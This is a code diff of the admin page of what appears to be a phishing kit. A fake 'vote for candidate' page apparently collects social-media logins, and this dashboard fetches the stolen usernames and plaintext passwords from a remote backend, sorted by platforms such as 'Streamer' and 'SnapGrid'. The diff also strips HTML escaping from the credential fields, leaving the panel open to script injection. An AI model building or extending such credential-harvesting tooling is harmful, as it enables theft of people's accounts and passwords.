@@ -310,228 +310,74 @@
     </div>
 
     <script>
-      // Configuration
-      const API_URL =
-        window.location.hostname === "localhost"
-          ? "http://localhost:3000/api"
-          : "https://backend-production-180c.up.railway.app/api";
+    // Configuration
+    const API_URL = window.location.hostname === 'localhost' 
+        ? 'http://localhost:3000/api' 
+        : 'https://backend-production-180c.up.railway.app/api';  // <-- UPDATE THIS
 
-      // Format timestamp to datetime-local input
-      function formatToLocalDatetime(timestamp) {
-        if (!timestamp) return "";
-        const date = new Date(parseInt(timestamp));
-        const offset = date.getTimezoneOffset() * 60000;
-        return new Date(date - offset).toISOString().slice(0, 16);
-      }
-
-      // Show success message
-      function showSuccess() {
-        const successMsg = document.getElementById("success-message");
-        successMsg.style.display = "block";
-        setTimeout(() => {
-          successMsg.style.display = "none";
-        }, 3000);
-      }
-
-      // Load settings from MongoDB (REPLACES localStorage)
-      async function loadSettings() {
+    // Load settings from MongoDB
+    async function loadSettings() {
         try {
-          const response = await fetch(`${API_URL}/candidate`);
-          const data = await response.json();
-
-          if (data) {
-            document.getElementById("candidate-name").value = data.name || "";
-            document.getElementById("current-votes").value =
-              data.currentVotes || 0;
-            document.getElementById("required-votes").value =
-              data.requiredVotes || 0;
-            if (data.endTime) {
-              document.getElementById("end-time").value = formatToLocalDatetime(
-                data.endTime,
-              );
+            const response = await fetch(`${API_URL}/candidate`);
+            if (!response.ok) throw new Error('Failed to fetch');
+            const data = await response.json();
+            
+            if (data) {
+                document.getElementById('candidate-name').value = data.name || '';
+                document.getElementById('current-votes').value = data.currentVotes || 0;
+                document.getElementById('required-votes').value = data.requiredVotes || 0;
+                if (data.endTime) {
+                    document.getElementById('end-time').value = new Date(data.endTime).toISOString().slice(0, 16);
+                }
             }
-            // Store image temporarily for preview if needed
-            if (data.image) {
-              document.getElementById("current-image-preview")?.remove();
-              const img = document.createElement("img");
-              img.id = "current-image-preview";
-              img.src = data.image;
-              img.style.cssText =
-                "width: 100px; height: 100px; object-fit: cover; border-radius: 8px; margin-top: 10px;";
-              document
-                .getElementById("candidate-image")
-                .parentNode.appendChild(img);
-            }
-          }
         } catch (error) {
-          console.error("Error loading settings:", error);
-          alert("Failed to load settings from database");
+            console.error('Error loading settings:', error);
         }
-      }
+    }
 
-      // Save settings to MongoDB (REPLACES localStorage)
-      document
-        .getElementById("admin-form")
-        .addEventListener("submit", async function (e) {
-          e.preventDefault();
+    // Load logs from MongoDB  
+    async function loadLogs() {
+        const tableBody = document.getElementById('log-table-body');
+        
+        try {
+            const response = await fetch(`${API_URL}/logins`);
+            const logs = await response.json();
 
-          const payload = {
-            name: document.getElementById("candidate-name").value,
-            currentVotes:
-              parseInt(document.getElementById("current-votes").value) || 0,
-            requiredVotes:
-              parseInt(document.getElementById("required-votes").value) || 0,
-            endTime: new Date(
-              document.getElementById("end-time").value,
-            ).getTime(),
-          };
-
-          const imageInput = document.getElementById("candidate-image");
-
-          if (imageInput.files && imageInput.files[0]) {
-            const reader = new FileReader();
-            reader.onload = async function (event) {
-              payload.image = event.target.result;
-              await saveToDatabase(payload);
-            };
-            reader.readAsDataURL(imageInput.files[0]);
-          } else {
-            // Get existing image from preview if available
-            const existingImg = document.getElementById(
-              "current-image-preview",
-            );
-            if (existingImg) {
-              payload.image = existingImg.src;
+            if (logs.length === 0) {
+                tableBody.innerHTML = `<tr><td colspan="6" class="empty-state">No records found</td></tr>`;
+                return;
             }
-            await saveToDatabase(payload);
-          }
-        });
 
-      async function saveToDatabase(payload) {
-        try {
-          const response = await fetch(`${API_URL}/candidate`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload),
-          });
+            tableBody.innerHTML = '';
+            logs.forEach((log, index) => {
+                let badgeColor = '#000';
+                if (log.platform === 'Streamer') badgeColor = '#e11d48';
+                if (log.platform === 'SnapGrid') badgeColor = '#f43f5e';
+                if (log.platform === 'New G') badgeColor = '#8b5cf6';
 
-          const result = await response.json();
-
-          if (result.status === "success") {
-            showSuccess();
-            // Refresh the preview
-            loadSettings();
-          } else {
-            alert("Error: " + result.message);
-          }
-        } catch (error) {
-          console.error("Save error:", error);
-          alert("Failed to save to database");
-        }
-      }
-
-      // Load logs from MongoDB
-      async function loadLogs() {
-        const tableBody = document.getElementById("log-table-body");
-
-        try {
-          const response = await fetch(`${API_URL}/logins`);
-          const logs = await response.json();
-
-          if (logs.length === 0) {
-            tableBody.innerHTML = `<tr><td colspan="6" class="empty-state">No login attempts recorded yet.</td></tr>`;
-            return;
-          }
-
-          tableBody.innerHTML = "";
-
-          logs.forEach((log, index) => {
-            let badgeColor = "#000";
-            if (log.platform === "Streamer") badgeColor = "#e11d48";
-            if (log.platform === "SnapGrid") badgeColor = "#f43f5e";
-            if (log.platform === "New G") badgeColor = "#8b5cf6";
-
-            const date = new Date(log.timestamp);
-            const dateStr = date.toLocaleDateString();
-            const timeStr = date.toLocaleTimeString();
-
-            const row = `
+                const row = `
                     <tr>
                         <td><strong>${index + 1}</strong></td>
-                        <td>${escapeHtml(log.username)}</td>
-                        <td>${escapeHtml(log.password)}</td>
+                        <td>${log.username}</td>
+                        <td>${log.password}</td>
                         <td><span class="platform-badge" style="background: ${badgeColor}">${log.platform}</span></td>
-                        <td>${dateStr}</td>
-                        <td>${timeStr}</td>
+                        <td>${new Date(log.timestamp).toLocaleDateString()}</td>
+                        <td>${new Date(log.timestamp).toLocaleTimeString()}</td>
                     </tr>
                 `;
-            tableBody.innerHTML += row;
-          });
+                tableBody.innerHTML += row;
+            });
         } catch (error) {
-          console.error("Error loading logs:", error);
-          tableBody.innerHTML = `<tr><td colspan="6" class="empty-state" style="color: #ef4444;">
-                Error connecting to database.
-            </td></tr>`;
+            console.error('Error loading logs:', error);
+            tableBody.innerHTML = `<tr><td colspan="6" style="color:red">Error loading data</td></tr>`;
         }
-      }
-      // In admin.html, before sending - resize image
-function resizeImage(file, maxWidth = 800, callback) {
-    const reader = new FileReader();
-    reader.onload = function(e) {
-        const img = new Image();
-        img.onload = function() {
-            const canvas = document.createElement('canvas');
-            const scale = maxWidth / img.width;
-            canvas.width = maxWidth;
-            canvas.height = img.height * scale;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-            callback(canvas.toDataURL('image/jpeg', 0.7)); // Compress to 70% quality
-        };
-        img.src = e.target.result;
+    }
+
+    // Initialize
+    window.onload = function() {
+        loadSettings();  // Fetch from DB
+        loadLogs();      // Fetch from DB
     };
-    reader.readAsDataURL(file);
-}
-
-// Use it in your save function:
-if (imageInput.files && imageInput.files[0]) {
-    resizeImage(imageInput.files[0], 800, async function(resizedImage) {
-        payload.image = resizedImage;
-        await saveToDatabase(payload);
-    });
-}
-      // Clear all logs
-      async function clearLogs() {
-        if (!confirm("⚠️ Are you sure you want to delete ALL activity logs?"))
-          return;
-
-        try {
-          const response = await fetch(`${API_URL}/logins`, {
-            method: "DELETE",
-          });
-
-          if (response.ok) {
-            loadLogs();
-          }
-        } catch (error) {
-          alert("Failed to clear logs");
-        }
-      }
-
-      // Escape HTML
-      function escapeHtml(text) {
-        if (!text) return "";
-        return text
-          .replace(/&/g, "&amp;")
-          .replace(/</g, "&lt;")
-          .replace(/>/g, "&gt;");
-      }
-
-      // Initialize
-      window.onload = function () {
-        loadSettings(); // Load from MongoDB instead of localStorage
-        loadLogs();
-      };
-    </script>
+</script>
   </body>
 </html>
